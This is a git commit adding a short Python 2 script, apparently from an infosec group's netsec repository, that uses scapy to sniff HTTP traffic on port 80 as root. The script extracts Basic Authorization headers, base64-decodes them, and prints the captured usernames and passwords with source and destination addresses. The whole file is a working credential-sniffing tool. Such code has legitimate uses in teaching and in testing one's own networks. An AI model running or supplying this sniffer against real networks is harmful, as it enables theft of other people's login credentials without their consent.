8fcebb84ff716208bf62dab1d53e504a4107686a
daguy666 <jpistonejr@gmail.com>
2018-07-11 13:28:10 -0400

    first code commit.

---
+++ netsec/basicSneef.py
@@ -0,0 +1,62 @@
+#!/usr/bin/env python
+# -----------------------------------------------------------
+# Filename      : basicSneef.py
+# Description   :
+# Created By    : Joe Pistone
+# Date Created  : 28-Nov-2015 
+# Date Modified : 11-July-2018 
+# Change desc   : Copied over to cnjinfosec netsec repo
+# License       : Development
+#
+# Description   : Sniff packets for basic authorization
+# Group         : Central New Jersey Infosec
+# (c) Copyright 2017, TheKillingTime all rights reserved.
+#-----------------------------------------------------------
+
+__author__  = "Joe Pistone"
+__version__ = "0.1"
+
+import re
+import os
+
+import logging
+
+# Setup logging for scapy to run at Error level.
+logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+
+from scapy.all import *
+# Cleans up Scapy's mess a little bit.
+conf.verb=0
+
+
+reg = re.compile(r'^authorization:\s+(.*)$', re.I|re.M)
+
+def basic_grabber(packet):
+    """Scans the payload of the TCP packet for
+       basic authorization. Then pulls out the
+       username and password.
+    """
+    basic_packet = str(packet[TCP].payload)
+    output = reg.search(basic_packet)
+    if output:
+        basic_auth = output.group(1).replace('Basic ','').decode('base64')
+        creds      = basic_auth.split(":")
+        print "--" * 25
+        print "[=>] Destination: %s" % packet[IP].dst
+        print "[=>] Source: %s" % packet[IP].src
+        print "[=>] Username: %s" % creds[0]
+        print "[=>] Password: %s" % creds[1]
+        print "--" * 25
+        print ""
+
+
+if __name__ == '__main__':
+    try:
+        if os.getuid() == 0:
+            print "[-] Listening for traffic on port 80 ....\n"
+            sniff(filter='tcp port 80', prn=basic_grabber, store=0)
+        else:
+            print "[!] Please run this script as root."
+    except Exception, e:
+        print '[!] Error! %s' % e
+
